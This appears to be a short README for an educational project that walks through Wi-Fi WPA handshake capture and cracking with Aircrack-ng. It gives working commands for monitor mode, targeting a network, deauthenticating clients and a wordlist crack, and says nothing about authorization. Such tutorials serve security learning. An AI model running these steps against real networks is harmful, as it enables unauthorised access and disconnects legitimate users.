# wifi-handshake-capture-and-crack-demo
"Educational project demonstrating Wi-Fi handshake capture and cracking using Aircrack-ng and Kali Linux."

### STEPS:- ###

## 📡 Step 1: Enable Monitor Mode on Wi-Fi Adapter
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up

## 📶 Step 2: Scan for Nearby Wi-Fi Networks
sudo airodump-ng wlan0mon

## 🎯 Step 3: Target Specific Wi-Fi Network
sudo airodump-ng --bssid <BSSID> -c <channel> -w capture wlan0mon
Replace <BSSID> and <channel> with actual values.
-w capture saves the captured packets as capture.cap.

## 💣 Step 4: Deauthenticate a Connected Device (Trigger Handshake)
In a new terminal:
sudo aireplay-ng --deauth 10 -a <BSSID> wlan0mon

## 🔍 Step 5: Verify the Handshake
Open the .cap file in Wireshark:
wireshark capture-01.cap

## 🔓 Step 6: Crack the Wi-Fi Password Using Aircrack-ng
Use a wordlist like rockyou.txt:
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <BSSID> capture-01.cap

## If the password is in the wordlist, it will be displayed as:
KEY FOUND! [ password_here ]
